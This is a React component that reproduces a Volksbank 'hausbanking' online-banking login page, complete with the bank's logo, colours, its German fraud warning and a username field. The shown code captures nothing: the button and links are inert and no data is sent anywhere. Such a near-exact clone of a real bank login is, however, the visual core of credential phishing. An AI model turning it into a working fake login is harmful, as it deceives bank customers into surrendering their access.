import { useState } from "react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankBg from "@/assets/volksbank-bg.png";
import { AlertTriangle } from "lucide-react";

const Volksbank = () => {
  const [username, setUsername] = useState("");

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-start justify-center py-10 px-4"
        style={{
          backgroundImage: `url(${volksbankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] shadow-lg rounded overflow-hidden">
          {/* Blue header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-lg"
            style={{ backgroundColor: "#00579B" }}
          >
            hausbanking Login
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Warning box */}
            <div
              className="flex items-start gap-3 p-4 rounded"
              style={{ backgroundColor: "#FFF8E1", border: "1px solid #E08A00" }}
            >
              <AlertTriangle className="w-6 h-6 flex-shrink-0 mt-0.5" style={{ color: "#E08A00" }} />
              <div className="text-sm" style={{ color: "#E08A00" }}>
                <p className="font-bold mb-1">
                  Achtung: Anrufe FALSCHER Bankmitarbeiter!
                </p>
                <p>
                  NIEMALS Passwörter, PINs oder TANs an Anrufer weitergeben!
                </p>
                <p>
                  SOFORT auflegen und Ihre Bank kontaktieren!
                </p>
              </div>
            </div>

            {/* Info text */}
            <p className="text-sm" style={{ color: "#666" }}>
              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre
              Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
            </p>

            {/* Label row */}
            <div className="flex items-center justify-between">
              <span className="font-semibold text-sm" style={{ color: "#333" }}>
                Anmeldung mit Benutzername
              </span>
              <span className="text-sm space-x-2">
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#00579B" }}>
                  Barrierefrei
                </a>
                <span style={{ color: "#999" }}>|</span>
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#00579B" }}>
                  English
                </a>
              </span>
            </div>

            {/* Username input */}
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-3 py-2.5 border rounded text-sm outline-none focus:ring-2"
              style={{
                backgroundColor: "#f5f5f5",
                borderColor: "#ccc",
              }}
              placeholder=""
            />

            {/* Terms text */}
            <p className="text-xs text-center" style={{ color: "#888" }}>
              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den{" "}
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{ color: "#00579B" }}
                className="underline"
              >
                Nutzungsbedingungen
              </a>{" "}
              der Bank ausdrücklich zu.
            </p>

            {/* Weiter button */}
            <button
              className="w-full py-3 text-white font-semibold rounded text-sm"
              style={{ backgroundColor: "#00579B" }}
            >
              Weiter
            </button>

            {/* Links */}
            <div className="flex flex-col items-center gap-1 pt-1">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-sm underline"
                style={{ color: "#00579B" }}
              >
                Benutzername vergessen?
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-sm underline"
                style={{ color: "#00579B" }}
              >
                Passwort vergessen?
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Volksbank;
